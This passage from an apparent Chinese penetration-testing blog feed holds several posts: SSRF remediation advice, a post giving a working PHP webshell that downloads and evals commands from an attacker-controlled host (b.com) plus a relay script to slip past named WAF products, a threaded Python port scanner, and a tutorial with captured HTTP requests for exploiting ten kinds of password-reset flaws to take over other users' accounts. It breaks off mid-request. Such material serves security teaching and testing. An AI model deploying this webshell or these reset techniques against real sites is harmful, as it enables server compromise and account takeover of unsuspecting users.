src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/70.png" alt="图片"></p><blockquote><p>扫描/探测后，开放了：80、8080、912、902、3306端口</p></blockquote><p><code>80</code>：<code>HTTP</code></p><p><code>8080</code>：<code>代理服务器</code>端口(因为打开了BurpSuite)</p><p><code>912</code>：<code>虚拟机</code>监听端口</p><p><code>902</code>：<code>Vmware</code>使用的端口</p><p><code>3306</code>：<code>Mysql</code>服务默认端口</p><h2 id="SSRF漏洞修复建议"><a href="#SSRF漏洞修复建议" class="headerlink" title="SSRF漏洞修复建议"></a>SSRF漏洞修复建议</h2><p><code>过滤</code>返回信息，<code>验证</code>远程服务器对请求的响应是比较容易的方法。如果<code>web应用</code>是去获取某一种类型的文件。那么在把<code>返回结果</code>展示给用户之前<code>先验证返回的信息</code>是否<code>符合标准</code>。</p><p><code>统一</code>错误信息，避免用户可以根据<code>错误信息</code>来<code>判断</code>远端服务器的<code>端口状态</code>。</p><p>限制请求的端口为<code>http</code>常用的端口，比如，<code>80</code>,<code>443</code>,<code>8080</code>,<code>8090</code>。</p><p><code>黑名单</code>内网ip。避免应用被用来获取获取内网数据，攻击内网。</p><p>禁用不需要的协议。仅仅<code>允许http</code>和<code>https</code>请求。可以防止类似于<code>file:///</code>,<code>gopher://</code>,<code>ftp:// </code>等引起的问题。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞原理 </tag>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>新思路多句话过D盾、安全狗、阿里云等WAF</title>
      <link href="/2019/06/02/penetrationtest-2/"/>
      <url>/2019/06/02/penetrationtest-2/</url>
      
        <content type="html"><![CDATA[<p>日常我们遇到的WAF对webshell查杀拦截主要是通过文件内容分析查杀，和网络传输层面的流量分析拦截，以及执行层面的拦截，常见的绕过基本都是花指令的一套，<code>0x007er</code>大佬研究出来一种新型的绕过方法发布在<a href="https://www.t00ls.net/articles-51085.html" title="T00ls">T00ls</a>。</p><p>目标站：a.com</p><p>需要准备一个你自己可控外网的主机做跳板 b.com</p><p>a.com 上传muma.php如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$handle = fopen (&quot;http://b.com/bypass.txt&quot;, &quot;rb&quot;);</span><br><span class="line">$contents = &quot;&quot;;</span><br><span class="line">do &#123;</span><br><span class="line">$data = fread($handle, 8192);</span><br><span class="line">if (strlen($data) == 0)</span><br><span class="line">&#123;break;&#125;</span><br><span class="line">$contents .= $data;</span><br><span class="line">&#125; while(true);</span><br><span class="line">fclose ($handle);</span><br><span class="line">$c = array();</span><br><span class="line">array_push($c,$contents);</span><br><span class="line">eval($c[0]);</span><br></pre></td></tr></table></figure><p>b.com 上传l.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$bypassFile = fopen(&quot;bypass.txt&quot;, &quot;w&quot;);</span><br><span class="line">$code = $_POST[code];</span><br><span class="line">fwrite($bypassFile,$code );</span><br><span class="line">fclose($bypassFile);</span><br><span class="line"></span><br><span class="line">print(file_get_contents(&quot;http://a.com/muma.php&quot;));</span><br></pre></td></tr></table></figure><p>菜刀 直接连b.com/l.php 连上去后控制的是a.com</p><h2 id="原理如图："><a href="#原理如图：" class="headerlink" title="原理如图："></a>原理如图：</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/57.png" alt="图片"></p><h2 id="已经测试：最新版D盾，最新版安全狗，阿里云云盾"><a href="#已经测试：最新版D盾，最新版安全狗，阿里云云盾" class="headerlink" title="已经测试：最新版D盾，最新版安全狗，阿里云云盾"></a>已经测试：最新版D盾，最新版安全狗，阿里云云盾</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/58.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/59.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/60.png" alt="图片"></p><blockquote><p>讨论：因为攻击指令并不是直接提交给目标服务器，而是由目标服务器主动去下载指令，而下载指令的流量不被WAF审查，从防御角度来说，像云盾这种CDN类型的WAF如何对这种手段加防御？</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python武器库-简易的端口扫描器</title>
      <link href="/2019/05/30/python-1/"/>
      <url>/2019/05/30/python-1/</url>
      
        <content type="html"><![CDATA[<h2 id="运行环境"><a href="#运行环境" class="headerlink" title="运行环境"></a>运行环境</h2><p><a href="https://www.python.org/downloads/release/python-373/" title="Python3">Python3</a></p><h2 id="用到模块"><a href="#用到模块" class="headerlink" title="用到模块"></a>用到模块</h2><p><a href="http://python.jobbole.com/89290/" title="socket">socket</a></p><p><a href="https://www.jianshu.com/p/653cfc4bda55" title="threading">threading</a></p><h2 id="代码如下"><a href="#代码如下" class="headerlink" title="代码如下"></a>代码如下</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">def main(target):</span><br><span class="line">    print(&#x27;开始扫描IP： %s&#x27;% target)</span><br><span class="line">    for port in range(1,65535):</span><br><span class="line">        t = threading.Thread(target=hackport, args=(target, port))</span><br><span class="line">        t.start()</span><br><span class="line">def hackport(target,port):</span><br><span class="line">    try:</span><br><span class="line">        res = socket.socket(socket.AF_INET,socket.SOCK_STREAM)  # 创建socket套接字</span><br><span class="line">        res.connect((target,port))  # 建立TCP连接</span><br><span class="line">        print(&quot;[*HACK ONE提示*] %s:%d 端口开放&quot;%(target,port))</span><br><span class="line">        res.close()</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    target=input(&quot;请输入IP：&quot;)</span><br><span class="line">    main(target)</span><br><span class="line">    print(&#x27;*************HACK ONE提醒您,扫描完毕...*************&#x27;)</span><br></pre></td></tr></table></figure><h2 id="运行实例："><a href="#运行实例：" class="headerlink" title="运行实例："></a>运行实例：</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/56.png" alt="图片"></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程 </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用户密码重置找回10种常见姿势</title>
      <link href="/2019/05/28/penetrationtest-1/"/>
      <url>/2019/05/28/penetrationtest-1/</url>
      
        <content type="html"><![CDATA[<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/21.jpg" alt="图片"></p><p>本篇文章来源<a href="https://www.sqlsec.com/2017/10/resetpass.html" title="国光">国光</a>记的笔记，原型是大神<code>carry_your</code>讲师(360补天排名第一)的<code>任意用户密码重置的10种常见姿势</code>总结的笔记。</p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1297389899&auto=1&height=66"></iframe><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>本次文章主要针对挖掘逻辑漏洞中的任意用户密码重置方法和原理从10种常见情况进行了讲述，并结合漏洞挖掘中的真实案例场景与数据包演示了重置密码漏洞的检测方法，让大家对这一类逻辑漏洞有从浅入深，逐步深奥的见解。</p><h2 id="验证码不失效"><a href="#验证码不失效" class="headerlink" title="验证码不失效"></a>验证码不失效</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/22.png" alt="图片"></p><h2 id="造成原因"><a href="#造成原因" class="headerlink" title="造成原因"></a>造成原因</h2><p>找回密码的时候获取的验证码缺少时间限制仅值判断了验证码是够正确未判断验证码是否过期</p><h2 id="测试方法"><a href="#测试方法" class="headerlink" title="测试方法"></a>测试方法</h2><p>通过<code>枚举</code>找到真正的验证码输入验证码完成验证</p><h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><p>输入目标手机号，获取验证码随意输入验证码<code>1234</code>点击下一步，拦截数据包:</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/23.png" alt="图片"></p><p>数据包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /Account/CheckYQCode HTTP/1.1</span><br><span class="line">Host: www.xxxx.cn</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0</span><br><span class="line">Accept: */*Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Referer:</span><br><span class="line">http://www.xxxx.cn/userCenter/toForgetPsdPage.html?mobile=</span><br><span class="line">Content-Length: 11</span><br><span class="line">Cookie: ASP.NET_SessionId=30jfruwn22h2xng3ahhzo2jxConnection: close</span><br><span class="line"></span><br><span class="line">YQCode=1234</span><br></pre></td></tr></table></figure><p>这种验证码<code>不失效</code>而且验证码是<code>4</code>位数的情况下,直接爆破 看包的返回长度或者内容来找到正确的验证码。</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/24.png" alt="图片"></p><p>得到正确的验证码是<code>1059</code>然后到网站上输入验证码跳转到输入新密码的页面完成<code>重置密码</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/25.png" alt="图片"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这种验证码不失效的情况现在已经是非常少见的了，而且验证码的位数也很少有简单的<code>4</code>位验证码了。现在绝大多数是这样的：<code>6</code>位数的验证码而且15分钟内有效，这样子的话爆破的可能性就非常的低了。</p><h2 id="验证码直接返回"><a href="#验证码直接返回" class="headerlink" title="验证码直接返回"></a>验证码直接返回</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/26.png" alt="图片"></p><h2 id="造成原因-1"><a href="#造成原因-1" class="headerlink" title="造成原因"></a>造成原因</h2><p>输入手机号后点击获取验证码，验证码在<code>客户端</code>生成，并直接返回在<code>Response</code>以方便对接下来的验证码进行比对。</p><h2 id="测试方法-1"><a href="#测试方法-1" class="headerlink" title="测试方法"></a>测试方法</h2><p>直接输入目标手机号，点击获取验证码，并观察返回包即可。在返回包中得到目标手机号获取的验证码，进而完成验证，重置密码成功。</p><h2 id="案例-1"><a href="#案例-1" class="headerlink" title="案例"></a>案例</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/27.png" alt="图片"></p><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>这种情况上次狗哥也拿出来了这样一个类似的案例，记得他那个情况是在找回密码返回包中，直接返回了旧密码的<code>md5</code>值，然后修改返回包可以直接重置管理员的密码。</p><h2 id="验证码未绑定用户"><a href="#验证码未绑定用户" class="headerlink" title="验证码未绑定用户"></a>验证码未绑定用户</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/28.png" alt="图片"></p><h2 id="造成原因-2"><a href="#造成原因-2" class="headerlink" title="造成原因"></a>造成原因</h2><p>输入手机号和验证码进行重置密码的时候，仅对验证码是够正确进行了判断，未对该验证码是否与手机号匹配做验证。</p><h2 id="测试方法-2"><a href="#测试方法-2" class="headerlink" title="测试方法"></a>测试方法</h2><p>在提交手机号和验证码的时候，替换手机号为他人手机号进行测试，成功通过验证并重置他人密码。</p><h2 id="案例一"><a href="#案例一" class="headerlink" title="案例一"></a>案例一</h2><p>首先使用自己的手机号接收验证码</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/29.png" alt="图片"></p><p>然后输入自己的手机号接收到的验证码，点击下一步并拦截数据包。</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/30.png" alt="图片"></p><p>最后替换数据包里的目标手机号，然后发包<code>数据包</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /tofindPasswordByPhone3.do HTTP/1.1</span><br><span class="line">Host: www.xxxx.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://www.xxxx.com/tofindPasswordByPhone2.do?mobile=131234xxxxx&amp;captcha=qkan&amp;checkbox=on</span><br><span class="line">Cookie: JSESSIONID=D4DB3147DBF941799B9CA74E4364F2F9; CNZZDATA1257851838=1754906772-1467355802-%7C1467355802; Hm_lvt_203f11422b4fcc8e2be8c54b036c5ff9=1467357432; Hm_lpvt_203f11422b4fcc8e2be8c54b036c5ff9=1467357978; smsRand=&quot;d9[x]1gSjADrs[d]&quot;; td_cookie=699947232;</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 33</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>mobile</code>的值改为我们想要重置的用户手机号点击下一步，跳转到设置密码的页面输入新密码，提交就成功重置了<code>13888888888</code>的密码。</p><h2 id="案例二"><a href="#案例二" class="headerlink" title="案例二"></a>案例二</h2><p>这个案例是验证码未绑定用户延伸一下，有时候测试会遇到这种，我们发现用户名被加密了，有无法得到具体的加密算法，怎么办？</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/31.png" alt="图片"></p><p>其实大部分这种情况我们都不需要知道加密算法，比如这里例子，得到<code>liuyy</code>的加密后的值是<code>80e688602c4b11e66320c421e3b71ef2</code>，那么我们就可以直接利用这个<code>keyCode</code>参数了。</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/32.png" alt="图片"></p><p>步骤是一样的，输入我们的用户名和收到的验证码，然后把我们的<code>keycode</code>替换为<code>liuyy</code>的那个<code>keycode</code>，这样就可以重置liuyy的密码了。(漏洞原因还是是判断了验证码是否正确，而没有判断该验证码是否跟该用户匹配。)</p><h2 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h2><p>这种情况没有遇到过，学习了，以后在找回密码的时候会这么测试的。现在看来对于白帽子来说有2个手机号是多么的方便了。<br>案例二中如何获取到其他用户的<code>keyCode</code>呢？这里的话正常走一遍找回密码的流程，然后抓包就会在数据包中找到加密后的<code>keyCode</code>了，这样就可以重置任意用户的密码了。</p><h2 id="修改接受验证码的手机或邮箱"><a href="#修改接受验证码的手机或邮箱" class="headerlink" title="修改接受验证码的手机或邮箱"></a>修改接受验证码的手机或邮箱</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/33.png" alt="图片"></p><h2 id="造成原因-3"><a href="#造成原因-3" class="headerlink" title="造成原因"></a>造成原因</h2><p>用户名、手机号、验证码三者没有统一进行验证，仅判断了三者中的手机号和验证是否匹配和正确，如果正确则判断成功并进入下一流程。</p><p>测试方法<br>输入用户名获取验证码，修改接收验证码的手机号为自己的号码，自己手机成功接收验证码，提交到网站进行验证，验证成功并进入下一流程。</p><h2 id="案例-2"><a href="#案例-2" class="headerlink" title="案例"></a>案例</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/34.png" alt="图片"></p><p>点击找回密码，首先我们输入<code>zhangwei</code>，然后点击获取验证码，这个时候把<code>手机号</code>改为我们自己的号码，(一般情况下这里是在数据包中进行修改的)，然后输入我们<code>自己</code>的号码和验证码，成功跳到重置密码的页面，密码重置成功。</p><h2 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h2><p><code>carry_your</code>大神说这种情况下还是比较常见的，这里不是很能理解，为什么程序员开发的时候不做用户名和手机号的匹配呢？我平时测试的时候，很少遇到这种不做用户名和手机号匹配的情况 ⊙﹏⊙|||</p><h2 id="本地验证绕过"><a href="#本地验证绕过" class="headerlink" title="本地验证绕过"></a>本地验证绕过</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/35.png" alt="图片"></p><h2 id="造成原因-4"><a href="#造成原因-4" class="headerlink" title="造成原因"></a>造成原因</h2><p>客户端在<code>本地进行</code>验证码是否正确的<code>判断</code>，而该<code>判断结果</code>也可以在本地修改，最终导致<code>欺骗客户端</code>，误以为我们已经输入了正确的验证码。</p><h2 id="测试方法-3"><a href="#测试方法-3" class="headerlink" title="测试方法"></a>测试方法</h2><p>重置目标用户，输入错误验证码，修改返回包，把错误改为正确，即可绕过验证步骤，最终重置用户密码。</p><h2 id="案例-3"><a href="#案例-3" class="headerlink" title="案例"></a>案例</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/36.png" alt="图片"></p><p>输入手机号<code>13888888888</code>，输入验证码<code>123456</code>，验证码错误的时候，返回包返回的是<code>0</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/37.png" alt="图片"></p><p>这里我们所做的就是把<code>0</code>修改为<code>1</code>，可以借工具修改返回包，我们把<code>0</code>改为<code>1</code>，然后查看页面，成功跳转到修改密码的页面，输入新密码即可修改用户<code>13888888888</code>的密码</p><h2 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h2><p><code>who_jeff</code>大神曾经分享给过这样一个类似的案例，当时他是在一个安卓<code>app</code>上进行抓包测试的，当时就直接修改返回包 来欺骗本地的<code>app</code>客户端的，成功重置任意用户的密码。</p><h2 id="跳过验证步骤"><a href="#跳过验证步骤" class="headerlink" title="跳过验证步骤"></a>跳过验证步骤</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/38.png" alt="图片"></p><p>##造成原因</p><p>对修改密码的步骤，没有做校验，导致可以直接输入最终修改密码的网址，直接跳转到该页面，然后输入新密码达到重置密码的目的。</p><h2 id="测试方法-4"><a href="#测试方法-4" class="headerlink" title="测试方法"></a>测试方法</h2><p>首先使用<code>自己</code>的账号<code>走一次流程</code>，<code>获取</code>每个步骤的页面<code>链接</code>，然后记录页面<code>3</code>对应的输入新密码的链接，重置他人用户时，获取验证码后，直接输入页面<code>3</code>链接到新密码的界面，输入密码重置成功。</p><h2 id="案例-4"><a href="#案例-4" class="headerlink" title="案例"></a>案例</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/39.png" alt="图片"></p><p>首先我们走一下所有的步骤，页面1、页面2、页面3，然后记录下页面3的链接</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/40.png" alt="图片"></p><p>然后尝试重置他人的用户。(ps:页面<code>3</code>是在我们的邮箱里接收到的链接)<br>是某集团系统，所以用户<code>wangshuai</code>，邮箱对应<code>wangshuai@xxx.com.cn</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/41.png" alt="图片"></p><p>使用账户<code>wangshuai</code>，点击获取验证码，然后补齐下面的链接<code>https://xxx/page/login/veifyAccess.html?username=wangshuai&amp;email=wangshuai@xxx.com.cn</code>，访问后即可<code>直接重置</code>该用户的密码</p><h2 id="总结-5"><a href="#总结-5" class="headerlink" title="总结"></a>总结</h2><p>这个漏洞不用按照正常的流程来走，这里的话直接补齐设置新密码的链接，然后利用这里链接可以直接重置任意用户的密码。</p><h2 id="未校验用户字段的值"><a href="#未校验用户字段的值" class="headerlink" title="未校验用户字段的值"></a>未校验用户字段的值</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/42.png" alt="图片"></p><h2 id="造成原因-5"><a href="#造成原因-5" class="headerlink" title="造成原因"></a>造成原因</h2><p>在整个重置密码的流程中，只对<code>验证码</code>和<code>手机号</code>做了校验，<code>未对</code>后面<code>设置新密码</code>的用户身份做<code>判断</code>，导致在<code>最后一步</code>通过修改用户身份来<code>重置他人</code>的密码。</p><h2 id="测试方法-5"><a href="#测试方法-5" class="headerlink" title="测试方法"></a>测试方法</h2><p>使用<code>自己</code>的手机号<code>走流程</code>，在走到<code>最后一个</code>设置密码的<code>流程</code>时，<code>修改数据包</code>里的用户信息。</p><h2 id="案例-5"><a href="#案例-5" class="headerlink" title="案例"></a>案例</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/43.png" alt="图片"></p><p>使用自己的手机号走流程，最后一步的数据包:</p><p>数据包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /yw_xxx/regist/saveNewPwd.action HTTP/1.1</span><br><span class="line">Host: www.xxx.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://www.xxx.com/yw_xxx/regist/toSetPwd.action</span><br><span class="line">Cookie: td_cookie=2080441838; JSESSIONID=530DD2516536F63131A1C098089CF2FB; JSESSIONID=5F3E182FAE378C1E799342C059F923B9Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 57</span><br><span class="line"></span><br><span class="line">upassword=qwer1111&amp;upassword1=qwer1111&amp;mphone=131234xxxxx</span><br></pre></td></tr></table></figure><p>我们可以看到密码找回成功</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/44.png" alt="图片"></p><p>而且参数中只有<code>密码</code>和<code>用户名</code>，<code>cookie</code>值无效，只需要修改指定用户名的值，就可以重置他人的用户密码。</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/45.png" alt="图片"></p><p>修改用户为<code>13888888888</code>，在发送数据包，我们就成功的把<code>138</code>的密码修改为<code>qwer111</code></p><h2 id="总结-6"><a href="#总结-6" class="headerlink" title="总结"></a>总结</h2><p>这里的话关键是在最后一步重置密码的时候替换目标手机号，这种其实也是比较暴力的，拿到这个链接的话 可以无条件批量重置任意用户的密码，这里面利用<code>burp</code>可以批量枚举手机号码的<code>mphone</code>参数。</p><h2 id="修改密码处id可替换"><a href="#修改密码处id可替换" class="headerlink" title="修改密码处id可替换"></a>修改密码处id可替换</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/46.png" alt="图片"></p><h2 id="造成原因-6"><a href="#造成原因-6" class="headerlink" title="造成原因"></a>造成原因</h2><p>修改密码的时候，没有对<code>原密码</code>进行判断，且根据<code>id</code>的值来修改用户的密码，类似的<code>SQL</code>语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update user set  password=&quot;qwer1234&quot; where id = ‘1’</span><br></pre></td></tr></table></figure><p>修改数据包里的id的值，即可修改他人密码。</p><h2 id="测试方法-6"><a href="#测试方法-6" class="headerlink" title="测试方法"></a>测试方法</h2><p>修改自己用户密码，抓取数据包，替换数据包中用户对应的<code>id</code>值，即可修改他人的密码。</p><h2 id="案例-6"><a href="#案例-6" class="headerlink" title="案例"></a>案例</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/47.png" alt="图片"></p><p>点击<code>立即提交</code>，得到右边的数据包，测试发现修改id为<code>5</code>，就可以把对应的用户密码修改为<code>123456</code>，没有对用户的原始密码判断，也没有判断<code>id</code>是否属于该用户。</p><p>数据包:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /Index/user/userinfo.html HTTP/1.1</span><br><span class="line">Host: 192.168.8.31:8088Content-Length: 63Cache-Control: max-age=0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Origin: http://192.168.8.31:8088</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 UBrowser/6.1.2107.202 Safari/537.36</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Referer: http://192.168.8.31:8088/Index/user/userinfo.html</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8</span><br><span class="line">Cookie: PHPSESSID=28af1649bcbcb0e0dd83afa017691a03; __sticket=hKdyp310daeBfKWqgnimZoB2zrKwespkfaaVm4KKpN-Fp3tokWJ-YJeQqWOXe9mpf5-br8dox6SUlX_Rgn2t05GVpZ6Jqoaqg3zMoY-rnnM.6.a.</span><br><span class="line"></span><br><span class="line">id=6&amp;user_name=kefu1&amp;password=123456&amp;name=kefu123&amp;email=&amp;phone=</span><br></pre></td></tr></table></figure><p>这里的<code>id</code>和<code>kefu1</code>的所在参数<code>user_name</code>并没有去判断是否为用一个用户，这里修改<code>id</code>是可以任意修改其他用户的密码的。</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/48.png" alt="图片"></p><p>这里在不修改<code>user_name</code>的情况下，只修改<code>id</code>值就<code>成功重置</code>了用户的密码。</p><h2 id="总结-7"><a href="#总结-7" class="headerlink" title="总结"></a>总结</h2><p>这种也比较暴力流氓，可以通过枚举<code>id</code>的值 ，来大批量重置任意用户密码的漏洞，因为不需要用户名了，只需要知道<code>id</code>值即可，危害比较大。</p><h2 id="cookie值的替换"><a href="#cookie值的替换" class="headerlink" title="cookie值的替换"></a>cookie值的替换</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/49.png" alt="图片"></p><h2 id="造成原因-7"><a href="#造成原因-7" class="headerlink" title="造成原因"></a>造成原因</h2><p>重置密码走到最后一步的时候仅判断唯一的用户标识<code>cookie</code>是否存在，并没有判断该<code>cookie</code>有没有通过之前重置密码过程的验证，导致可替换<code>cookie</code>重置他人用户密码。(<code>cookie</code>可指定用户获取。)</p><h2 id="测试方法-7"><a href="#测试方法-7" class="headerlink" title="测试方法"></a>测试方法</h2><p>重置自己用户密码到达最后阶段，抓到数据包，并在<code>第一阶段</code>重新获取目标用户<code>cookie</code>，替换<code>cookie</code>到我们抓取的数据包中，发包测试。</p><h2 id="案例-7"><a href="#案例-7" class="headerlink" title="案例"></a>案例</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/50.png" alt="图片"></p><p>首先我们重置自己的用户<code>wang111</code>的密码到最后一步，成功重置密码，抓到如下数据包。</p><p>数据包:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /ppc/valid/resetPassword.do HTTP/1.1</span><br><span class="line">Host: www.xxx.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) 